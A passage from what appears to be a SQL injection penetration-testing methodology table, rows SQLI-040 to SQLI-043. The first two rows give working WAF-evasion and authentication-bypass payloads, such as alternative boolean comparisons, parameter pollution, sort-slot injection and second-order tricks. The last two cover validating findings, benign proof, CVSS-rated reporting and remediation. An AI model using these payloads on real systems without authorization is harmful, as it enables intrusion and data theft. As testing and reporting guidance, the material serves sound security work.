| SQLI-040 | Logic/comparison variety (= blocked) | Evasion — WAF/Filter | Filters blocking = or common boolean forms | 1. Replace =: LIKE, &lt;&gt;, BETWEEN, IN, &gt;, &lt;.<br>2. Vary truth: ' OR 'a'='a -&gt; ' OR 2&gt;1 -&gt; ' OR 1 IN (1).<br>3. AND-&gt;&amp;&amp; , OR-&gt;&#124;&#124; (MySQL). | An equivalent comparison bypasses the blocked operator and preserves the boolean logic. | <code>' OR 'a' LIKE 'a'-- -<br>' OR 2&gt;1-- -<br>' OR 1 IN (1)-- -</code> | Keeps boolean/auth-bypass injections working when '=' or 'OR 1=1' is filtered. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-89; PayloadsAllTheThings/SQL Injection |
| SQLI-041 | HPP, identifier-slot &amp; second-order as WAF bypass | Evasion — WAF/Filter | Front-end parameterized or response-diff normalized by WAF/cache | 1. HTTP parameter pollution: id=1&amp;id=2 (some stacks concat duplicates).<br>2. If values are bound, hunt the identifier/sort slot (raw column name).<br>3. Store where the WAF doesn't inspect, trigger later (second-order).<br>4. If response-diff is normalized, switch to TIME (delay survives). | A path the WAF does not inspect (duplicate param, sort slot, stored value, timing) carries the injection. | <code>id=1&amp;id=2<br>?sort=(SELECT ... )<br>store payload -&gt; trigger admin consumer</code> | Bypasses WAFs and 'mostly parameterized' apps by attacking the slots they don't protect. | High | 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, sqlmap --tamper | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-042 | False-positive filter &amp; benign-proof discipline | Validation &amp; Reporting | Before reporting any candidate | 1. Reject non-findings: a lone 500/stack-trace with no query change; a reflected SQL error string (info leak, not injection); a single length blip (caching/jitter); 'sqlmap flagged it' with no hand proof; a slow endpoint with no SLEEP(5) vs SLEEP(0) control; $ne/$gt (that's NoSQL).<br>2. Require the QUERY to demonstrably change (other rows / true-false / delay / DNS hit / version / whoami).<br>3. Re-test oracles several times; reproduce by hand; confirm DBMS + technique. Never run destructive proof. | A reproducible query-behaviour change tied to your payload - not an error, blip, or tool flag. | <code>AND 1=1 vs AND 1=2 stable; SLEEP(5) vs SLEEP(0) controlled; hand-reproduced.</code> | Protects credibility and avoids self-DoS/destructive actions; separates real SQLi from noise. | Info | 0.0 (N/A) | Burp, manual verification | CWE-89; PortSwigger Web Security Academy: SQL injection; OWASP WSTG-INPV-05 |
| SQLI-043 | Client-facing impact &amp; PoC package (CWE-89 + CVSS) | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with the highest impact on the sink (RCE &gt; auth bypass &gt; dump).<br>2. Provide exact request, context, DBMS, technique, and benign proof (version()+1 row / whoami / DNS hit).<br>3. Set CVSS 3.1 + CWE-89 (+ CWE-287 auth bypass / CWE-78 RCE). Remediation: parameterized queries/prepared statements, allowlist identifier/sort inputs, least-privilege DB user, disable xp_cmdshell/local_infile, WAF as defence-in-depth.<br>4. De-dupe to one finding per sink. | A reproducible, correctly-rated, benign PoC with clear remediation. | <code>PoC: request + benign proof (version/whoami/DNS) + CVSS + CWE-89 + fix guidance.</code> | Converts the finding into a defensible, actionable report at the correct severity. | Info | 0.0 (N/A) | Burp, CVSS calculator, SQL_INJECTION_REPORT_TEMPLATE.md | CWE-89; CWE-287; CWE-78; FIRST CVSS v3.1  &#124;  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; OWASP; sqlmap wiki; academic SQLi research |
